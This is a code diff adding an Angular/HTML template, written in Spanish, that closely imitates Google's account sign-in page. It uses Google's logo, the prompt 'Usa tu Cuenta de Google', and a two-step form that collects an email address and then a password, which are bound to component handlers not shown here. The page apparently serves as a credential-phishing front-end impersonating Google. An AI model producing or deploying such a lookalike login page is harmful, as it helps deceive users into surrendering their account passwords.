@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Iniciar Sesión</title>
+</head>
+<body>
+  <div class="login-container">
+    <div class="center-image">
+      <img src="https://1000marcas.net/wp-content/uploads/2020/02/logo-Google.png" alt="" width="130" height="80" />
+      <h2>Acceder</h2>
+      <div class="h3">
+        <h5>Usa tu Cuenta de Google</h5>
+      </div>
+  
+      <div *ngIf="mostrarTarjetaCorreo; else tarjetaContrasena">
+        
+        <form (ngSubmit)="enviarCorreo()" #forma="ngForm">
+          <div class="form-group">
+            <label for="email">Correo Electrónico</label>
+            <input type="email" id="email" name="email" [(ngModel)]="correo" required />
+          </div>
+          <div class="form-group">
+            <a href="">¿Olvidaste el correo electrónico?</a>
+          </div>
+          <div class="form-group">
+            <label for="email">¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada. <a href="">Más información</a></label>
+          </div>
+  
+          <div class="form-group">
+            <div class="row">
+              <div class="col-1"></div>
+              <div class="col-4 tx">
+                <a class="nav-link active" aria-current="page" href="#">Crear Cuenta</a>
+              </div>
+              <div class="col-1"></div>
+              <div class="col-6">
+                <button type="button" (click)="mostrarTarjetaCorreo = false">Siguiente</button>
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
+  
+      <ng-template #tarjetaContrasena>
+       
+        <form (ngSubmit)="enviarContrasena()" #passwordForm="ngForm">
+          <div class="form-group">
+            <label for="password">Contraseña</label>
+            <input
+              type="password"
+              id="password"
+              name="password"
+              [(ngModel)]="contrasena"
+              required
+            />
+          </div>
+          <button type="submit" class="boton-azul">Sign-in</button>
+
+        </form>
+      </ng-template>
+    </div>
+  </div>
+
+  <script
+    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+    crossorigin="anonymous"
+  ></script>
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+    integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
+    crossorigin="anonymous"
+  />
+</body>
+</html>
